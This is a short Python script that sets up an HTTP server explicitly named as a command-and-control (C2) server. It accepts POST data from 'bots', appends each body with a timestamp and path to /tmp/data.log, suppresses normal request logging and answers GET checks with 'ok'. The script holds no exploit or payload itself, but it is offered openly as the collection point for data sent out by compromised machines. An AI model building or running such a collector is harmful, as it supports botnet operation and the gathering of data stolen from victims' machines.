from http.server import HTTPServer, BaseHTTPRequestHandler
import datetime
import os

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open('/tmp/data.log', 'a') as f:
            f.write(f"\n[{timestamp}] PATH: {self.path}\n")
            f.write(f"DATA: {body.decode(errors='ignore')}\n")
        print(f"[{timestamp}] bot data received — {self.path}", flush=True)
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{}')

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'ok')

port = int(os.environ.get('PORT', 8080))
server = HTTPServer(('0.0.0.0', port), C2Handler)
print(f"C2 running on port {port}...", flush=True)
server.serve_forever()
